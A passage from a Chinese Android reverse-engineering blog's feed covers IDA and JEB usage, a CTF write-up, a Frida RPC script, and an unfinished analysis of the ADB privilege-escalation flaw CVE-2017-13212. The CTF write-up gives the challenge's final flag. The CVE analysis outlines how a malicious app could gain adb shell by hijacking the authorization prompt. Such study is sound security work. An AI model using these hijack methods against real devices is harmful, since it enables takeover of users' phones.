    <summary type="html">&lt;h3 id=&quot;整体界面&quot;&gt;&lt;a href=&quot;#整体界面&quot; class=&quot;headerlink&quot; title=&quot;整体界面&quot;&gt;&lt;/a&gt;整体界面&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/Users/tasfa/Desktop/%E6%A1%8C%E9%9D%A2/android%E5%9F%B9%E8%AE%AD&amp;%E5%88%86%E4%BA%AB/%E9%83%A8%E9%97%A8%E5%9F%B9%E8%AE%AD/class3/ida_main.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;File , Edit , Jump , Search , View , Debugger , Options , Windows , Help&lt;/strong&gt; 9个Tab菜单&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1.File 文件操作相关、脚本操作相关、snapshot相关操作&lt;/li&gt;
&lt;li&gt;2.Edit 功能比较多，主要涉及修改查询注释等&lt;/li&gt;
&lt;li&gt;3.Jump 是用来跳转的，可以有很多种类型的跳转，比如跳转到上一个位置或者下一个位置，跳转到某个指定的地址。还可以根据名字，函数来进行跳转，跳转到一个新的窗口，跳转某一个偏移量等等&lt;/li&gt;
&lt;li&gt;4.Serach 搜索相关操作&lt;/li&gt;
&lt;li&gt;5.View 是用来选择显示方式的，或者显示某一特定模块信息的。比如以树形逻辑图显示，或者16进制形式显示。还可以单独显示某一特定信息，比如输入或者输出表等。&lt;/li&gt;
&lt;li&gt;6.Debugger 动态调试&lt;/li&gt;
&lt;li&gt;7.Options 在这里可以进行一下常规性的设置&lt;/li&gt;
&lt;li&gt;8.Windows 窗口相关的一些操作&lt;/li&gt;
&lt;li&gt;9.Help 使用IDA的一些帮助文档，检查更新等等。&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="代码分析" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    <category term="动态调试" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    
    
    <category term="ida" scheme="http://example.com/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>Jeb分析总结</title>
    <link href="http://example.com/2021/05/10/Jeb%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2021/05/10/Jeb%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</id>
    <published>2021-05-10T06:44:59.000Z</published>
    <updated>2021-06-07T08:09:59.509Z</updated>
    
    <content type="html"><![CDATA[<h3 id="JEB使用"><a href="#JEB使用" class="headerlink" title="JEB使用"></a>JEB使用</h3><h4 id="整体界面"><a href="#整体界面" class="headerlink" title="整体界面:"></a>整体界面:</h4><p><img src="https://www.pnfsoftware.com/jeb/manual/img/jeb-raasta-apk.png"></p><span id="more"></span><h4 id="整体UI名词解释"><a href="#整体UI名词解释" class="headerlink" title="整体UI名词解释:"></a>整体UI名词解释:</h4><p><img src="https://www.pnfsoftware.com/jeb/manual/img/jeb-raasta.png"></p><h4 id="Action-amp-Hotkey"><a href="#Action-amp-Hotkey" class="headerlink" title="Action &amp; Hotkey:"></a>Action &amp; Hotkey:</h4><p><img src="https://www.pnfsoftware.com/jeb/manual/img/jeb-menu-actions-basic.png"></p><p><strong>Tip:</strong> </p><ul><li>Ctrl+Space 查看历史命名.</li><li>None input 修改为原始名称</li></ul><h4 id="Navigating-amp-Hotkey"><a href="#Navigating-amp-Hotkey" class="headerlink" title="Navigating &amp; Hotkey"></a>Navigating &amp; Hotkey</h4><p><img src="https://www.pnfsoftware.com/jeb/manual/img/jeb-menu-nav.png"></p><h4 id="Native-Code-Actions"><a href="#Native-Code-Actions" class="headerlink" title="Native Code Actions"></a>Native Code Actions</h4><p><img src="https://www.pnfsoftware.com/jeb/manual/img/jeb-menu-actions-native.png"></p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><h4 id="什么是静态分析"><a href="#什么是静态分析" class="headerlink" title="什么是静态分析"></a>什么是静态分析</h4><p>静态分析是指在不运行代码的情况下，采用词法分析、语法分析等各种技术手段对程序文件进行扫描从而生成程序的反汇编代码，然后阅读反汇编代码来掌握程序功能的一种技术。</p><p>静态分析Android程序分以下几种:</p><p>Java层:</p><p>(1)阅读baksmali反汇编生成的Dalvik字节码，即分析smali文件</p><p>(2)阅读dex2jar/jd-gui反汇编生成的Java源码</p><p>Native层:</p><p>(3)阅读IDA Pro反汇编生成的SO文件ARM汇编代码</p><p>(4)阅读IDA Pro(F5)反汇编生成的so文件的c/c++源码</p><h4 id="定位关键代码"><a href="#定位关键代码" class="headerlink" title="定位关键代码"></a>定位关键代码</h4><h5 id="AndroidManifest-xml文件"><a href="#AndroidManifest-xml文件" class="headerlink" title="AndroidManifest.xml文件"></a>AndroidManifest.xml文件</h5><p>该文件记录着软件的一些基本信息，包括软件的包名、运行的系统版、用到的组件等等</p><h5 id="信息反馈法"><a href="#信息反馈法" class="headerlink" title="信息反馈法"></a>信息反馈法</h5><p>指先运行目标程序，然后根据程序运行时给出的反馈信息作为突破口寻找关键代码<br>一般情况下，字符串会存储在String.xml文件或者硬编码到程序代码中，可用ID形式访问或直接搜索字符串</p><p>(A)IDA下搜索特定字符串方法:</p><p>Ctrl+s 打开段选择对话框-&gt;双击String段跳转到字符串段-&gt;search-text（ALT+T）</p><p>(B)APKIDE下搜索特定字符串方法:</p><p>直接在右边窗口输入字符串进行搜寻，同时右键可对其进行编码或转换进制</p><h5 id="特征函数法"><a href="#特征函数法" class="headerlink" title="特征函数法"></a>特征函数法</h5><p>所谓特征函数法，意思就是我们根据程序的执行行为来判断程序可能调用了哪些函数。这一方法需要我们对于 Android 中的 API 比较熟悉。一般来说，我们可能会关注以下方面</p><ul><li>控件的事件函数</li><li><pre><code>onclick</code></pre></li><li><pre><code>show</code></pre></li><li><pre><code>Toast</code></pre></li><li>网络函数</li><li><pre><code>HttpGet</code></pre></li><li><pre><code>HttpPost</code></pre></li><li><pre><code>HttpUriRequest</code></pre></li><li><pre><code>socket</code></pre></li><li>发送短信</li><li>打电话</li><li>定位</li><li>等等</li></ul><h5 id="顺序查看法"><a href="#顺序查看法" class="headerlink" title="顺序查看法"></a>顺序查看法</h5><p>从OnCreate()函数切入，如果没有混淆可从main()函数切入，弄清程序的流程，IDA提供强大的帮助界面</p><h5 id="log信息法"><a href="#log信息法" class="headerlink" title="log信息法"></a>log信息法</h5><p>所谓 log 信息就是 Android 程序在运行时输出的字符串信息，这部分信息不会在我们的界面上体现，因而我们需要使用其它辅助工具来分析，比如说，我们可以使用 ddms 来辅助分析。对于 log 信息来说，我们可以从两个方面考虑</p><ul><li>利用程序本身产生的 log 信息</li><li>自己对代码反编译，插入 log 信息，并重打包来进行分析。</li></ul><h5 id="栈跟踪法"><a href="#栈跟踪法" class="headerlink" title="栈跟踪法"></a>栈跟踪法</h5><p>我们可以用 ddms 提供的方法调用链的信息来判断程序目前的调用关系如何。</p><h5 id="钩子-Hook-法"><a href="#钩子-Hook-法" class="headerlink" title="钩子(Hook)法"></a>钩子(Hook)法</h5><ul><li>xposed</li><li>cydia</li></ul><h5 id="monitor方法"><a href="#monitor方法" class="headerlink" title="monitor方法"></a>monitor方法</h5><ul><li>运行 log，程序运行产生的，系统运行产生的</li><li>线程跟踪</li><li>方法调用链</li></ul><h3 id="JEB静态分析实战"><a href="#JEB静态分析实战" class="headerlink" title="JEB静态分析实战"></a>JEB静态分析实战</h3><p>2014 ASIS Cyber Security Contest Finals Numdroid</p><h4 id="判断文件类型"><a href="#判断文件类型" class="headerlink" title="判断文件类型"></a>判断文件类型</h4><p>首先利用 file 命令判断一下文件类型，发现是个压缩包，解压缩一下，得到对应的文件，然后继续看一下，发现该文件是 apk 文件。</p><h4 id="安装程序"><a href="#安装程序" class="headerlink" title="安装程序"></a>安装程序</h4><p>安装一下程序。简单看一下页面，可以发现程序主要是输入0-9数字密码，然后登陆。如果输入错的话会爆出 “Wrong Password” 的信息。</p><h4 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h4><p>1、根据相应的字符串来定位一下源程序中的关键函数。根据 strings.xml 可以发现该字符串的变量名为 wrong，继而我们找到了如下代码。</p><p>2、也可以直接切入入口函数OnCreate函数进行流程分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">ok_clicked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DebugTools.log(<span class="string">&quot;clicked password: &quot;</span> + <span class="keyword">this</span>.mScreen.getText());</span><br><span class="line">    <span class="keyword">boolean</span> result = Verify.isOk(<span class="keyword">this</span>, <span class="keyword">this</span>.mScreen.getText().toString());</span><br><span class="line">    DebugTools.log(<span class="string">&quot;password is Ok? : &quot;</span> + result);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">        Intent i = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, LipSum.class);</span><br><span class="line">        Bundle b = <span class="keyword">new</span> Bundle();</span><br><span class="line">        b.putString(<span class="string">&quot;flag&quot;</span>, <span class="keyword">this</span>.mScreen.getText().toString().substring(<span class="number">0</span>, <span class="number">7</span>));</span><br><span class="line">        i.putExtras(b);</span><br><span class="line">        startActivity(i);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeText(<span class="keyword">this</span>, R.string.wrong, <span class="number">1</span>).show();</span><br><span class="line">    <span class="keyword">this</span>.mScreen.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续定位到 Verify.isOk 中。如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isOk</span><span class="params">(Context c, String _password)</span> </span>&#123;</span><br><span class="line">    String password = _password;</span><br><span class="line">    <span class="keyword">if</span> (_password.length() &gt; <span class="number">7</span>) &#123;</span><br><span class="line">        password = _password.substring(<span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    String r = OneWayFunction(password);</span><br><span class="line">    DebugTools.log(<span class="string">&quot;digest: &quot;</span> + password + <span class="string">&quot; =&gt; &quot;</span> + r);</span><br><span class="line">    <span class="keyword">if</span> (r.equals(<span class="string">&quot;be790d865f2cea9645b3f79c0342df7e&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现程序主要是取 password 的前 7 位进行 OneWayFunction 加密，然后与 be790d865f2cea9645b3f79c0342df7e 进行比较。如果相等就会返回 true。这里我们再看一下 OneWayFunction，如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">OneWayFunction</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">    List&lt;<span class="keyword">byte</span>[]&gt; bytes = ArrayTools.map(ArrayTools.select(ArrayTools.map(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;MD2&quot;</span>, <span class="string">&quot;MD5&quot;</span>, <span class="string">&quot;SHA-1&quot;</span>, <span class="string">&quot;SHA-256&quot;</span>, <span class="string">&quot;SHA-384&quot;</span>, <span class="string">&quot;SHA-512&quot;</span>&#125;, <span class="keyword">new</span> AnonymousClass1(password)), <span class="keyword">new</span> SelectAction&lt;<span class="keyword">byte</span>[]&gt;() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">action</span><span class="params">(<span class="keyword">byte</span>[] element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element != <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;), <span class="keyword">new</span> MapAction&lt;<span class="keyword">byte</span>[], <span class="keyword">byte</span>[]&gt;() &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">byte</span>[] action(<span class="keyword">byte</span>[] element) &#123;</span><br><span class="line">            <span class="keyword">int</span> i;</span><br><span class="line">            <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>];</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; b.length / <span class="number">2</span>; i++) &#123;</span><br><span class="line">                b[i] = element[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; b.length / <span class="number">2</span>; i++) &#123;</span><br><span class="line">                b[(b.length / <span class="number">2</span>) + i] = element[(element.length - i) - <span class="number">2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">byte</span>[] b2 = <span class="keyword">new</span> <span class="keyword">byte</span>[(bytes.size() * <span class="number">8</span>)];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; b2.length; i++) &#123;</span><br><span class="line">        b2[i] = ((<span class="keyword">byte</span>[]) bytes.get(i % bytes.size()))[i / bytes.size()];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        MessageDigest digest = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        digest.update(b2);</span><br><span class="line">        <span class="keyword">byte</span>[] messageDigest = digest.digest();</span><br><span class="line">        StringBuilder hexString = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">byte</span> aMessageDigest : messageDigest) &#123;</span><br><span class="line">            String h = Integer.toHexString(aMessageDigest &amp; MotionEventCompat.ACTION_MASK);</span><br><span class="line">            <span class="keyword">while</span> (h.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                h = <span class="string">&quot;0&quot;</span> + h;</span><br><span class="line">            &#125;</span><br><span class="line">            hexString.append(h);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.toString();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;  <span class="comment">// 注意这里，如果算法不存在的话，应该是会返回空字符串</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数大概就是执行了几个hash函数，由于Hash函数是不可逆的，因此这道题的唯一解法必然是爆破，这是很明显的一道爆破题。</p><p>由于代码中没有过度混淆且逻辑比较清晰，以及Hash算法并非自定义算法，涉及到的主要流程比较少，因此我们可以直接把Verify类抠出来直接跑。</p><h4 id="构造程序"><a href="#构造程序" class="headerlink" title="构造程序"></a>构造程序</h4><p>提取出 java 程序之后，在 Verify 类中添加 main 函数并修复部分错误，从而得到对应的答案。</p><p>需要注意的点是，由于Hash算法不存在的话，会返回空字符串，因此PC端和Android可能出现相同算法出现不同的结果，原因就在这里。</p><p>输入之后得到结果</p><p>然后我们计算对应的 MD 值，从而获得 flag 为 ASIS_{3c56e1ed0597056fef0006c6d1c52463}</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>IDA使用,参考书籍<a href="http://bbs.pediy.com/showthread.php?t=187367" target="_blank">《IDA Pro权威指南》</a> </p><p><a href="http://www.360doc.com/content/06/0821/08/1130_186349.shtml" target="_blank">查看IDA简易教程</a></p><p>JEB官网: <a href="https://www.pnfsoftware.com/jeb/">JEB</a></p><p>JEB用户手册: <a href="https://www.pnfsoftware.com/jeb/manual/">Manual</a></p><p>JEB Api: <a href="https://www.pnfsoftware.com/jeb/apidoc/reference/packages.html">Apidoc</a>（a developer portal for advanced users who will want to use the JEB API to script tasks, develop plugins, or even craft their own front-ends）</p><p>JEB Blog: <a href="https://www.pnfsoftware.com/blog/category/jeb2/api-jeb2/">Blog</a><br>(We recommend visiting our blog for additional, pointed resources describing a variety of use cases.)</p><p>本文属学习笔记原创，转载请注明出处tasfa.cn,如有问题，请联系管理员<a href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#x74;&#x61;&#x73;&#x66;&#x61;&#x2e;&#99;&#110;">&#x72;&#x6f;&#111;&#116;&#64;&#x74;&#x61;&#x73;&#x66;&#x61;&#x2e;&#99;&#110;</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;JEB使用&quot;&gt;&lt;a href=&quot;#JEB使用&quot; class=&quot;headerlink&quot; title=&quot;JEB使用&quot;&gt;&lt;/a&gt;JEB使用&lt;/h3&gt;&lt;h4 id=&quot;整体界面&quot;&gt;&lt;a href=&quot;#整体界面&quot; class=&quot;headerlink&quot; title=&quot;整体界面:&quot;&gt;&lt;/a&gt;整体界面:&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;https://www.pnfsoftware.com/jeb/manual/img/jeb-raasta-apk.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="代码分析" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    <category term="静态分析" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
    
    <category term="jeb" scheme="http://example.com/tags/jeb/"/>
    
  </entry>
  
  <entry>
    <title>Frida-主动调用(RPC)</title>
    <link href="http://example.com/2021/05/10/Frida-%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8-RPC/"/>
    <id>http://example.com/2021/05/10/Frida-%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8-RPC/</id>
    <published>2021-05-10T06:16:34.000Z</published>
    <updated>2021-05-22T13:10:54.205Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>此Post讲述如何利用Frida主动调用Java函数以及Native函数。</p><ul><li>Context获取</li><li>类新构造</li><li>Native指针构造</li><li>…</li></ul><span id="more"></span><h3 id="Frida主动调用Java函数"><a href="#Frida主动调用Java函数" class="headerlink" title="Frida主动调用Java函数"></a>Frida主动调用Java函数</h3><p>js脚本:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">rpc.exports = &#123;</span><br><span class="line">    myfunc: <span class="function"><span class="keyword">function</span>(<span class="params">queryId</span>)</span>&#123;</span><br><span class="line">        Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> currentApplication = Java.use(<span class="string">&#x27;android.app.ActivityThread&#x27;</span>).currentApplication();</span><br><span class="line">                <span class="keyword">var</span> context = currentApplication.getApplicationContext();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> classJq = Java.use(<span class="string">&quot;a.b.c.jq&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> objJq = classJq.a(context,<span class="string">&quot;param&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> HashSet = Java.use(<span class="string">&quot;java.util.HashSet&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> idSet = HashSet.$new();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> Integer = Java.use(<span class="string">&quot;java.lang.Integer&quot;</span>);</span><br><span class="line">                idSet.add(Integer.valueOf(queryId));       </span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(e)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>py脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time,os</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">adb_forward</span>():</span></span><br><span class="line">    os.system(<span class="string">&quot;adb forward tcp:27042 tcp:27042&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;adb forward tcp:27043 tcp:27043&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_message_handler</span>(<span class="params">message, payload</span>):</span></span><br><span class="line">    print(message)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">adb_forward()</span><br><span class="line">rdev = frida.get_remote_device()</span><br><span class="line">session = rdev.attach(<span class="string">&quot;com.xxx.xx&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rpcCall.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">idList = [<span class="number">1234</span>]</span><br><span class="line">idList.sort()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> idList:</span><br><span class="line">    rel = script.exports.myfunc(idx)</span><br></pre></td></tr></table></figure><h3 id="frida主动调用Native函数"><a href="#frida主动调用Native函数" class="headerlink" title="frida主动调用Native函数"></a>frida主动调用Native函数</h3><p>待解决</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;p&gt;此Post讲述如何利用Frida主动调用Java函数以及Native函数。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Context获取&lt;/li&gt;
&lt;li&gt;类新构造&lt;/li&gt;
&lt;li&gt;Native指针构造&lt;/li&gt;
&lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="代码干预" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%B9%B2%E9%A2%84/"/>
    
    <category term="Hook" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%B9%B2%E9%A2%84/Hook/"/>
    
    <category term="Frida" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%B9%B2%E9%A2%84/Hook/Frida/"/>
    
    
    <category term="Frida" scheme="http://example.com/tags/Frida/"/>
    
  </entry>
  
  <entry>
    <title>ADB配置提权漏洞(CVE-2017-13212)原理与利用分析</title>
    <link href="http://example.com/2018/10/07/ADB%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-CVE-2017-13212-%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2018/10/07/ADB%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-CVE-2017-13212-%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</id>
    <published>2018-10-07T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.203Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h3><p>adb由于拥有shell权限，因此仅在授权PC端后才可使用shell权限，而通过该漏洞，可以实现在移动端获取shell权限，以致于可随意删除应用、屏幕截图等等高权限操作。不过移动端恶意应用程序必须能够连接到adbd正在监听的TCP端口，这就需要应用程序在它的AndroidMainifest.xml中定义INTERNET权限。</p><p>而漏洞作者所用的攻击方法是构造一个覆盖窗口，劫持用户点击，也就是经典的hijack攻击。Google也据此修复了此种攻击方式。</p><p><strong>但是，我经过尝试后发现，除了以上构造hijack攻击窗口外，还可以劫持USB广播，然后在用户进行正常的连接电脑操作时，劫持授权界面，使用户误导从而进行授权。也即造成新的劫持授权漏洞方案。</strong></p><span id="more"></span><p>影响:<br><img src="/Users/tasfa/Downloads/1.png"></p><h3 id="0x02-原理分析"><a href="#0x02-原理分析" class="headerlink" title="0x02 原理分析"></a>0x02 原理分析</h3><p>为了让恶意应用程序能够利用此配置漏洞，首先其必须识别adbd正在监听的TCP端口，然后向守护进程验证其自身。一旦通过身份验证，恶意应用程序就可以作为adb shell用户在设备上执行命令。</p><p>使用adb命令“adb tcpip <port>”来启用adbd以监听TCP端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb tcpip 5555</span><br></pre></td></tr></table></figure><p>在启用了USB调试，且adbd正处于TCP端口监听的情况下，恶意应用程序可以利用自带的adb二进制文件连接adbd，或者可以实现adb server协议与adbd通信。如果adb server尚未被设备授权，则会触发认证请求并提示用户验证并接受RSA公钥。但此认证框可被覆盖(Google已经修复)，具体可见参考文章。</p><p>分析下<a href="https://android.googlesource.com/platform/frameworks/base/+/e012d705dd8172048c3f32113b2a671847e3d1a2%5E%21/">diff</a>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/packages/SystemUI/src/com/android/systemui/usb/UsbDebuggingActivity.java b/packages/SystemUI/src/com/android/systemui/usb/UsbDebuggingActivity.java</span><br><span class="line">index f5447a2.<span class="number">.329</span>dd99 <span class="number">100644</span></span><br><span class="line">--- a/packages/SystemUI/src/com/android/systemui/usb/UsbDebuggingActivity.java</span><br><span class="line">+++ b/packages/SystemUI/src/com/android/systemui/usb/UsbDebuggingActivity.java</span><br><span class="line"></span><br><span class="line">@@ <span class="number">-31</span>,<span class="number">8</span> +<span class="number">31</span>,<span class="number">12</span> @@</span><br><span class="line"> <span class="keyword">import</span> 